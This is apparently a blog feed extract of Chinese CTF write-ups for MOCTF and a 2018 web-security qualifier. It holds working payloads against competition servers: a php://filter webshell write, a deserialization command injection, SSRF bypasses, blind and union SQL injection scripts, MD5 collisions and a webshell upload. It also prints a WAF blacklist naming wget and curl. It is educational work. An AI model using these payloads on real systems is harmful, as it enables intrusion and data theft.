http://119.23.73.3:5006Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://119.23.73.3:5006/web1/post.htmlAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=hgcbrc4a6o6p6v14dpd8prvdj2postText=1&amp;Dear=MyBoss 0x10 Flag在哪？ 进入点击get flag，回显是there is no flag! 果断抓包看一下，考察302重定向12345678910111213141516171819202122带有特征的过程：GET /web7/flag.php HTTP/1.1=&gt;HTTP/1.1 302 FoundLocation: ./where_is_flag.php=&gt;GET /web7/./where_is_flag.php HTTP/1.1=&gt;HTTP/1.1 302 FoundLocation: ./I_have_a_flag.php=&gt;GET /web7/././I_have_a_flag.php HTTP/1.1=&gt;HTTP/1.1 302 FoundLocation: ./I_have_a_frog.php=&gt;GET /web7/./././I_have_a_frog.php HTTP/1.1=&gt;HTTP/1.1 302 FoundLocation: ./no_flag.php=&gt;GET /web7/././././no_flag.php HTTP/1.1 emmm，follow rediretion没有发现任何异常唯一有价值的就是body中内容：12345where is flag!I have a flagI have a frog!ah~ guess where is flag!There is no flag! 得知hint才知道，，这是一首歌曲:ppap，访问flagfrog.php得到答案 0x11 美味的饼干 登录admin，发现可以登录，抓包发现12345Set-Cookie: login=ZWUxMWNiYjE5MDUyZTQwYjA3YWFjMGNhMDYwYzIzZWU%3D解码为 user于是再次编码adminMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D得到flag 0x12 没时间解释了 进入后，发现url为 http://119.23.73.3:5006/web2/index2.php 。于是抓包，发现302重定向，得到提示：May be u need uploadsomething.php。访问上传页面，随便上传一个，123filename: adminconcet: admin路径：http://119.23.73.3:5006/web2/uploads/550d7c7c2a0c1d0dc373959b7d403de1d6783582/admin 访问，显示too low，猜测应该是，上传文件会在一定的时间删除吗，并且路径不变。于是bp.intrude走一波。1234567891011GET /web2/uploadsomething.php?filename=admin&amp;content=admin HTTP/1.1Host: 119.23.73.3:5006Proxy-Connection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9a=§1§ attack后 ,浏览器访问http://119.23.73.3:5006/web2/uploads/550d7c7c2a0c1d0dc373959b7d403de1d6783582/admin 即可得到flag 0x13 死亡退出123456789101112&lt;?php show_source(__FILE__); $c=&quot;&lt;?php exit;?&gt;&quot;; @$c.=$_POST[&apos;c&apos;]; @$filename=$_POST[&apos;file&apos;]; if(!isset($filename)) &#123; file_put_contents(&apos;tmp.php&apos;, &apos;&apos;); &#125; @file_put_contents($filename, $c); include(&apos;tmp.php&apos;);?&gt; 有include函数，首先想到文件包含，但是tmp.php不可控，只能执行tmp.php，可控的是temp.php的内容，于是通过php危险函数file_put_contents()写命令，c=bPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php，即可拿到flag123456789101112131415涉及到的两个知识点：1、file_put_contents()：file_put_contents(file,data,mode,context)data要写入的数据。类型可以是 string，array 或者是 stream 资源（如上面所说的那样）。如果 data 指定为 stream 资源，这里 stream 中所保存的缓存数据将被写入到指定文件中，这种用法就相似于使用 stream_copy_to_stream() 函数。就是将context内容写到data中。题目中：使用php://filter/write=convert.base64-decode/resource=tmp.php，tmp.php中写入内容，通过写入base64解码后的数据流实现，配合file_put_contents()使用进行写命令另外附上p牛对这个经典问题的分析https://www.leavesongs.com/PENETRATION/php-filter-magic.html2、base64 编码base64 解码表A-Z、a-z、0-9、+、/，其它的内容 base64 解码会将其过滤掉，比如&lt;?;&gt;与空格，就会自动过滤掉因为题目中的 &lt;?php exit;&gt; =&gt; phpexitbase64 算法解码时是4个byte一组，所以该题目如果phpexit正常解码，不影响后面的一句话，就必须构造8个字符。在 &lt;?php system(&apos;cat flag.php&apos;); ?&gt; base64编码的前面加一个字母即可 0x14 火眼金睛 这个题目意在靠脚本编写，做题时使用的非预期解，bp抓包后，在页面中，搜索moctf的个数，携带参数repeater，即可拿到flag附上预期解脚本：123456789101112131415import requestsimport retargeturl = &quot;http://119.23.73.3:5001/web10&quot;r = requests.get(url=targeturl)res_tr = r&quot;&apos;100&apos;&gt;(.*?)&lt;/textarea&gt;&quot;flagtxt = re.findall(res_tr,r.content)[0]re_moctf = r&quot;moctf&quot;moctf = re.findall(re_moctf,flagtxt)number = len(moctf)ans = &#123; &quot;answer&quot;:number&#125;url2 = &quot;http://119.23.73.3:5001/web10/work.php&quot;s = requests.post(url=url2,data=ans,cookies=r.cookies)print s.content 0x15 UNSET123456789101112131415161718192021222324252627282930313233&lt;?phphighlight_file(&apos;index.php&apos;);function waf($a)&#123;foreach($a as $key =&gt; $value)&#123; if(preg_match(&apos;/flag/i&apos;,$key))&#123; exit(&apos;are you a hacker&apos;);&#125;&#125;&#125;foreach(array(&apos;_POST&apos;, &apos;_GET&apos;, &apos;_COOKIE&apos;) as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; &#125;&#125;if($_POST) &#123; waf($_POST);&#125;if($_GET) &#123; waf($_GET); &#125;if($_COOKIE) &#123; waf($_COOKIE);&#125;if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);if(isset($_GET[&apos;flag&apos;]))&#123;if($_GET[&apos;flag&apos;] === $_GET[&apos;daiker&apos;])&#123; exit(&apos;error&apos;);&#125;if(md5($_GET[&apos;flag&apos;] ) == md5($_GET[&apos;daiker&apos;]))&#123; include($_GET[&apos;file&apos;]);&#125;&#125;?&gt; 分析逻辑：需要执行include($_GET[‘file’])=&gt;$_GET[‘file’]为flag.php，但是waf会过滤，那么为了完成这个目的，我们需要先绕过waf再读flag.php根据代码逻辑可以发现unset =&gt; waf检测 =&gt; 再次赋值那么关键性代码：12345foreach(array(&apos;_POST&apos;, &apos;_GET&apos;, &apos;_COOKIE&apos;) as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; 我们需要做的就是把$_GET的参数unset，过了waf再赋值，再利用文件包含读出flag.php的内容过程：1234567891011121、md5($_GET[&apos;flag&apos;] ) == md5($_GET[&apos;daiker&apos;])=&gt;flag=QNKCDZO&amp;daiker=s878926199a2、过waf=&gt;以flag参数为例子GET: ?flag=QNKCDZO =&gt;array(&apos;flag&apos; =&gt; &apos;QNKCDZO&apos;)post: _GET[x]=QNKCDZO先进行处理post参数 $$__R 是 $POST[_GET[x]] =&gt; array(&apos;_GET[x]&apos; =&gt; &apos;QNKCDZO&apos;) =&gt; $__k 是 _GET[x] =&gt; $$__k 是 $_GET[x] 是 QNKCDZO，于是符合 $$__k == $__v，执行unset($_GET[x])，即$__GET[flag]被unset了。后来extract()再次赋值 payload:12345678910111213POST /index.php?flag=QNKCDZO&amp;daiker=s878926199a&amp;file=php://filter/read=convert.base64-encode/resource=flag.php HTTP/1.1Host: 119.23.73.3:5101Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8Cookie: PHPSESSID=om11lglr53tm1htliteav4uhk4Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 112_GET[flag]=QNKCDZO&amp;_GET[daiker]=s878926199a&amp;_GET[file]=php://filter/read=convert.base64-encode/resource=flag.php 0x16 PUBG http://120.78.57.208:6001/?LandIn=school 发现该处.bak源码泄漏，下载index.php与class.php1234567# index.phpelseif($pos===&quot;school&quot;) &#123; echo(&apos;&lt;/br&gt;&lt;center&gt;&lt;a href=&quot;/index.html&quot; style=&quot;color:white&quot;&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;&apos;); $pubg=$_GET[&apos;pubg&apos;]; $p = unserialize($pubg); &#125; 可以发现是php反序列化漏洞12345678910111213141516171819202122232425262728# class.phppublic function __destruct()&#123; waf($this-&gt;bag); if($this-&gt;weapon===&apos;AWM&apos;) &#123; $this-&gt;Get_air_drops($this-&gt;bag); &#125;&#125;public function Get_air_drops($b)&#123; $this-&gt;$b();&#125;public function __call($method,$parameters) &#123; $file = explode(&quot;.&quot;,$method); echo $file[0]; if(file_exists(&quot;.//class$file[0].php&quot;)) &#123; system(&quot;php .//class//$method.php&quot;); &#125;else &#123; system(&quot;php .//class//win.php&quot;); &#125; die();&#125; 分析逻辑与过程12345678910111213141516171819202122232425262728293031323334 目的：__call()过程:唯一可控的为__destruct()=&gt; Get_air_drops($b)=&gt; $this-&gt;$b();刚好可以调用__call()注意：__wakeup()不能执行$b为命令 =&gt; $bag控制$bag即可$bag又经过waf处理做法：绕过__wakeup()，读waf绕过waf，rce原理：绕过__wakeup()CVE-2016-7124反序列化漏洞，通过传入错误的值绕过具体实现：从源码中在class/下发现flag.phpO:7:&quot;sheldon&quot;:2:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;=&gt;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;=&gt;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:13:&quot;flag.|cat%20waf&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;$black = array(&apos;vi&apos;,&apos;awk&apos;,&apos;-&apos;,&apos;sed&apos;,&apos;comm&apos;,&apos;diff&apos;,&apos;grep&apos;,&apos;cp&apos;,&apos;mv&apos;,&apos;nl&apos;,&apos;less&apos;,&apos;od&apos;,&apos;head&apos;,&apos;tail&apos;,&apos;more&apos;,&apos;tac&apos;,&apos;rm&apos;,&apos;ls&apos;,&apos;tailf&apos;,&apos;%&apos;,&apos;%0a&apos;,&apos;%0d&apos;,&apos;%00&apos;,&apos;ls&apos;,&apos;echo&apos;,&apos;ps&apos;,&apos;&gt;&apos;,&apos;&lt;&apos;,&apos;$&#123;IFS&#125;&apos;,&apos;ifconfig&apos;,&apos;mkdir&apos;,&apos;cp&apos;,&apos;chmod&apos;,&apos;wget&apos;,&apos;curl&apos;,&apos;http&apos;,&apos;www&apos;,&apos;`&apos;,&apos;printf&apos;);=&gt;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:20:&quot;flag.|cat%20class/flag&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;个人提醒一下，/class/flag与class/flag不一样 这里做了一个反序列化的测试123456789101112131415161718192021222324252627282930313233&lt;?php class sheldon&#123; public function __construct() &#123; echo &quot;__construct()&quot;; echo &quot;&lt;br/&gt;&quot;; &#125; public function __wakeup() &#123; echo &quot;__wakeup()&quot;; echo &quot;&lt;br/&gt;&quot;; &#125; public function __call($method,$parameters) &#123; echo &quot;__call()&quot;; echo &quot;&lt;br/&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;__destruct()&quot;; echo &quot;&lt;br/&gt;&quot;; &#125; &#125; $a = new sheldon; $sa = serialize($a); echo $sa; echo &quot;&lt;br/&gt;&quot;; $ua = unserialize($sa); var_dump($ua); echo &quot;&lt;br/&gt;&quot;; var_dump(unserialize(&apos;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;M24&quot;;&#125;&apos;)); echo &quot;&lt;br/&gt;&quot;; $a-&gt;b(); 输出结果：123456789101112__construct() //new 调用的O:7:&quot;sheldon&quot;:2:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;M24&quot;;&#125;__wakeup() //unserialize($a)调用的object(sheldon)#2 (2) &#123; [&quot;bag&quot;]=&gt; string(7) &quot;nothing&quot; [&quot;weapon&quot;]=&gt; string(3) &quot;M24&quot; &#125; Notice: unserialize(): Unexpected end of serialized data in A:\tools\phpStudy\WWW\study1\pre.php on line 33__destruct() //unserialize($a)调用的Notice: unserialize(): Error at offset 64 of 65 bytes in A:\tools\phpStudy\WWW\study1\pre.php on line 33bool(false) __call() //$a-&gt;b()调用的__destruct() //unserialize(&apos;O:7:&quot;sheldon&quot;:3:&#123;s:3:&quot;bag&quot;;s:7:&quot;nothing&quot;;s:6:&quot;weapon&quot;;s:3:&quot;M24&quot;;&#125;&apos;)调用的__destruct() // 照应new 0x17 网站检测 hint: doker -p 10001 80说明80端口映射到10001，url参数可以进行ssrf测试发现，必须http://moctf.com，过滤&#39;127&#39;，与点，flag.php使用url双编码123456789也考察url结构：方法//身份凭证@真是ip/路径有几个payloadpayload:url = http://www.moctf.com/0.0.0.0/%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30另外几个可以把0.0.0.0 =&gt; 127.0.0.1127.0.0.1=&gt; 8进制017700000001=&gt; 16进制0x7f000001 / 0x7f.1 0x18 简单注入 查看源代码发现注入点为 ?id测试发现空格，/**/，and，or，–+等被禁用使用异或盲注脚本：1234567891011121314151617181920212223242526272829import stringimport requestschars = &apos;!@$%^&amp;*()_+=-|&#125;&#123; :?&gt;&lt;[];,./`~&apos;string = string.ascii_letters+string.digits+charsrs = requests.session()flag = &quot;&quot;# 错误的payload# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(database())),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(group_concat(column_name))from(information_schema.columns)where(table_schema)=database()),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(mid((select(d0_you_als0_l1ke_very_long_column_name)from(do_y0u_l1ke_long_t4ble_name)),&#123;0&#125;,1)=&apos;&#123;1&#125;&apos;)^&apos;1&quot;# 正确payload# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(ascii(mid((select(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1))=&#123;1&#125;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)^&apos;1&quot;# payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(ascii(mid((select(group_concat(column_name))from(information_schema.columns)where(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)^&apos;1&quot;payload = &quot;http://119.23.73.3:5004/?id=2&apos;^(ascii(mid((select(d0_you_als0_l1ke_very_long_column_name)from(do_y0u_l1ke_long_t4ble_name)),&#123;0&#125;,1))=&#123;1&#125;)^&apos;1&quot;for i in range(0, 500): # for j in string: for j in range(33, 127): url = payload.format(str(i), str(j)) s = rs.get(url) # print url if &apos;Flag&apos; in s.text: flag = flag + chr(j) print flag 得到flag，题外话，因为注入姿势不对，这个题目交flag，交了一天，emmmmmm，大佬们有兴趣可以试试脚本上错误payload，能感受到当时的纠结的心情-.-(其实我在掩盖自己菜的事实)。记录一下错误原因：123456789101112131415mysql&gt; select (mid(&apos;Aa&apos;,1,1)=&apos;A&apos;);+---------------------+| (mid(&apos;Aa&apos;,1,1)=&apos;A&apos;) |+---------------------+| 1 |+---------------------+1 row in set (0.00 sec)mysql&gt; select (mid(&apos;Aa&apos;,1,1)=&apos;a&apos;);+---------------------+| (mid(&apos;Aa&apos;,1,1)=&apos;a&apos;) |+---------------------+| 1 |+---------------------+1 row in set (0.00 sec) 0x19 后记 依然能感觉到自己有很多不足，需要学习的太多了，多练习，多看大佬们的技术文章，紧随大佬的步伐。感谢星神等几位表哥的指点。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2018WEB安全测试秋季预选赛WriteUp]]></title>
    <url>%2F2018%2F10%2F28%2F1%2F</url>
    <content type="text"><![CDATA[题记：学校组织参加这个比赛，对于没有信安专业的学院来说，参赛重点就是嵌入式与开发者，留下我们自生自灭，在此记录一下，刷下一存在感吧，虽然没拿到理想结果，毕竟来过233333。错误的地方，欢迎大佬们指正。 2018WEB安全测试秋季预选赛 0x01 input传送门：http://114.55.36.69:8003/题目上说前三道题目是容易的，于是就从容易的题目入手，为了拿到1血，手速飞快地点，emmm，一紧张忘了js输出语句怎么写了，百度后才发现，自己有多蠢alert啊！ 进入网址，发现一个输入框，查看源码，发现id=”flag”，后面有一段js代码 123456789101112&lt;script&gt; function check()&#123; var flag = document.getElementById(&quot;flag&quot;).value; var str = &quot;d84d9657e5e5e&quot; || 0; var str = str + (&quot;ad2ad3fe&quot; &amp;&amp; 2); var str = str + &quot;a2da9494b8&quot; + &quot;ddea4fd4&quot;; var str = str.split(&quot;&quot;).reverse().join(&quot;&quot;); if (str == flag)&#123; alert(&quot;恭喜你已经找到flag！&quot;); &#125; &#125;&lt;/script&gt; 二话不说，直接console下执行，emmmm，可惜一下。提交即可 0x02 MD5传送门：http://114.55.36.69:8004/ 打开后发现一段文字：easy MD5 cracking fail。应该与MD5有关，简单的就是弱类型，再不就是MD5碰撞，查看源码，发现是考察PHP弱类型 1easy MD5 cracking &lt;!--$_POST[&apos;data1&apos;]!=$_POST[&apos;data2&apos;]--&gt;fail 脑补一下剩下的代码 123if(($_POST[&apos;data1&apos;]!=$_POST[&apos;data2&apos;])&amp;&amp;(md5($_POST[&apos;data1&apos;])==md5($_POST[&apos;data2&apos;])) echo $flag; 于是post传参：data1=QNKCDZO&amp;data2=240610708，得到答案 0x03 参数提交传送门：http://114.55.36.69:8012/ flag作为参数，post方式提交，提示必须大于10位，提交flag=11111111111，即可得到flag。-.- 0x04 新闻查询传送门：http://114.55.36.69:8010/ 先上图有关键词，有条数，初步猜测是注入，关键词输入1’发现查看源码，发现前端过滤 1234567891011121314151617function myFunction() &#123; var x=document.getElementById(&quot;number&quot;).value; var a=document.getElementById(&quot;word&quot;).value; var b=a.replace(/[\ |\~|\`|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\||\\|\[|\]|\&#123;|\&#125;|\;|\:|\&quot;|\&apos;|\,|\&lt;|\.|\&gt;|\/|\?|\·|\！|\（|\）|\￥|\——|\……|\【|\】|\、|\；|\：|\‘|\“|\”|\’|\，|\。|\、|\《|\》|\？|\ ]/g,&quot;&quot;); if(a.length!=b.length) &#123; alert(&quot;请输入正确字符。&quot;); document.getElementById(&quot;number&quot;).value = &apos;&apos;; document.getElementById(&quot;word&quot;).value = &apos;&apos;; &#125; else if(isNaN(x)) &#123; alert(&quot;请输入数字。&quot;); document.getElementById(&quot;number&quot;).value = &apos;&apos;; &#125; &#125; 于是手动禁掉js代码，并且猜测后端代码是关键词处查询处存在sql注入一直尝试，却没有任何回显，听说可以sqlmap直接跑，于是sqlmap启动！保存请求包，sqlmap -r payload.txt –dump当时时间也是关键，能出flag就可以，写这个时候，才手动注入，像这种的关键词查询，一般都是使用like%%的模糊查询,所以需要闭合%，构造payload：1%’ AND 1=1 AND ‘%’=’成功注入这里对like%%进行一些了解首先我们在本地数据库中输入12345678910111213141516mysql&gt; select * from tests where password like &apos;%a%&apos;;+---------+----------+| usename | password |+---------+----------+| admin | password || admin | admin |+---------+----------+2 rows in set (0.00 sec)mysql&gt; select * from tests where password like &apos;%as%&apos;;+---------+----------+| usename | password |+---------+----------+| admin | password |+---------+----------+1 row in set (0.00 sec) 可以发现like%$value%相当于/.*$value.*/，如果注入的话，我们需要闭合前面的%’,而且还有闭合后面的%’红框里面的内容为外部输入。了解完like%%的注入，接着看题目123456789# 得到列payload: 1%&apos; order by 3-- 返回正常payload: 1%&apos; order by 4--返回异常得知表有为3列# 找回显点payload: 1%&apos; union select 1,2,3-- 在页面下面出现1,2，3 12# 注入表，列，字段，此处省略过程payload: 1%&apos; union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),(select group_concat(column_name) from information_schema.columns where table_schema=database()),flag from admin-- 成功拿到flag 0x05 MD5碰撞传送门：http://114.55.36.69:8006/ 又是一个关于MD5的题目，而且提示依然为：MD5 crackingfail。这样从分值与顺序看起来，不出意外就是MD5碰撞，查看源码发现1if((string)$_POST[&apos;data1&apos;]!==(string)$_POST[&apos;data2&apos;]&amp;&amp;md5($_POST[&apos;data1&apos;])===md5($_POST[&apos;data2&apos;])) 这里两边都是强判断===，并且强制转换为string类型进行比较，听表哥说，只能通过md5碰撞绕过去先了解一下什么是md5碰撞12## md5碰撞从根本上讲，MD5算法是一种摘要算法，它可以从多个字节组成的串中计算出由32个字节构成的“特征串”。对于超过32字节的串来说，MD5计算得出的值必然是其一个子集，所以必然存在两个（或更多）不同的串能够得出相同MD5值的情况。这种情况就叫做MD5碰撞。 我们需要找到两个字符串不一样，但是MD5值一模一样的字符串，用MD5碰撞生成器生成 12345678910&gt; fastcoll_v1.0.0.5.exe -o data1.txt data2.txtMD5 collision generator v1.5by Marc Stevens (http://www.win.tue.nl/hashclash/)Using output filenames: &apos;data1.txt&apos; and &apos;data2.txt&apos;Using initial value: 0123456789abcdeffedcba9876543210Generating first block: .............Generating second block: S01.....Running time: 8.187 s 然后对data1.txt与data2.txt中的内容进行url编码后，curl发请求，或者在该网址中找，即可得到flag123456789101112131415161718192021222324root@Kali:~# curl -v http://114.55.36.69:8006/ -H &quot;Cookie: PHPSESSID=0dvvm795lrkrck7r0t1gbn762n&quot; --data &quot;data1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;data2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&quot;* Hostname was NOT found in DNS cache* Trying 114.55.36.69...* Connected to 114.55.36.69 (114.55.36.69) port 8006 (#0)&gt; POST / HTTP/1.1&gt; User-Agent: curl/7.38.0&gt; Host: 114.55.36.69:8006&gt; Accept: */*&gt; Cookie: PHPSESSID=0dvvm795lrkrck7r0t1gbn762n&gt; Content-Length: 315&gt; Content-Type: application/x-www-form-urlencoded&gt; * upload completely sent off: 315 out of 315 bytes&lt; HTTP/1.1 200 OK&lt; Date: Sun, 28 Oct 2018 16:57:05 GMT* Server Apache/2.2.15 (CentOS) is not blacklisted&lt; Server: Apache/2.2.15 (CentOS)&lt; X-Powered-By: PHP/5.3.3&lt; Content-Length: 156&lt; Connection: close&lt; Content-Type: text/html; charset=UTF-8&lt; * Closing connection 0MD5 cracking&lt;!-- if((string)$_POST[&apos;data1&apos;]!==(string)$_POST[&apos;data2&apos;]&amp;&amp;md5($_POST[&apos;data1&apos;])===md5($_POST[&apos;data2&apos;]))--&gt;flag&#123;9bd1ee7355b58e53214adb9a37b4cb82&#125; 在这备份几条 12345678# firstM%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2# second4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea24dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2MD5 hash:008ee33a9d58b51cfeb425b0959121c9 0x06 Game传送门：http://114.55.36.69:8011/ 进入界面是一款贪吃蛇游戏，果断看js代码逻辑F12查看源码外面是外部的js脚本，在Source中查看发现于是猜测这一段颜文字应该会有与flag相关的信息，于是console执行一下显然flag是错误的，点击view继续跟进参看12345(function anonymous() &#123;window[&apos;flag&apos;] = &apos;Flag&#123;660332922504a5f06dd871a7fe78ba9c&#125;&apos;;console.log(&quot;Flag&#123; hahahah wrong!! :(&#125;&quot;);&#125;) 得到flag 0x07 Notepad传送门：http://114.55.36.69:8014/index.php/ 功能齐全，直接注册帐号，进入upload修改type（只能传jpg）上传一张图片,然后在picture内查看到发现图片中有一串base64，在bp中查看发现这一串base很长，在请求包的cookie中发现picture值解码发现为php序列化，而且保存的上传文件的文件名猜测picture的值提交后，然后页面在img标签下会回显文件内容的base64。于是显示index.php页面，手动构造序列化，在这里我们先了解一下序列化的组成12345678910例子：a:2:&#123;i:0;s:5:&quot;1.jpg&quot;;i:1;s:5:&quot;1.php&quot;;&#125;a的意思就是数组array2说明数组里面有两对值分别为1.jpg与1.phpi作为下标s代表为string类型5表示长度即0=&gt;1.jpg1=&gt;1.php 所以我们可以构造为：a:1:{i:0;s:9:”index.php”;}，base64后为YToxOntpOjA7czo5OiJpbmRleC5waHAiO30=，bp重放查看回显做到这，有两个思路，一个是上传一句话然后getshell，因为路径是爆出来了，仅仅是type限制；第二个是直接才flag在哪，读出来。两种方法都很简单，不做细说，第一种改type为image/jpg后，访问http://114.55.36.69:8014/upload/x.php，然后传入命令find / -name flag*。第二种是测试发现，flag在../../flag.php下，然后构造a:1:{i:0;s:14:”../../flag.php”;}=&gt;YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=，请求1234567891011121314151617# requestGET /index.php/picture HTTP/1.1Host: 114.55.36.69:8014Proxy-Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://114.55.36.69:8014/index.php/pictureAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: Picture=YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30=; PHPSESSID=1vm2g30rlcqosqsj9ici1rdku1; session=eyJsb2dpbiI6dHJ1ZSwidXNlcm5hbWUiOiJYWEgifQ.DreFfA.iwKT84kXV5efjz90397IoKUYiik# response(part)&lt;img src=&quot;data:image/jpg;base64,PD9waHAKCiRmbGFnID0gImZsYWd7TjRtZV9zUGFjNF9Jc19JbnQzcjNzdDFuZ30iOwplY2hvICJmbGFne1RoaXNfMVNfQV9GNGtlX2YxYUd9IjsK&quot;&gt;# base64解密&lt;?php$flag = &quot;flag&#123;N4me_sPac4_Is_Int3r3st1ng&#125;&quot;;echo &quot;flag&#123;This_1S_A_F4ke_f1aG&#125;&quot;; 得到flag 后记 emmmm，实力有限，只能做出这么几道，至于排名感觉进不去下一场比赛啊。对于萌新的我，做这几道题目，费劲了一下午，晚上感谢小可爱的陪伴，有你真幸福。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hash长度扩展攻击]]></title>
    <url>%2F2018%2F05%2F10%2F1%2F</url>
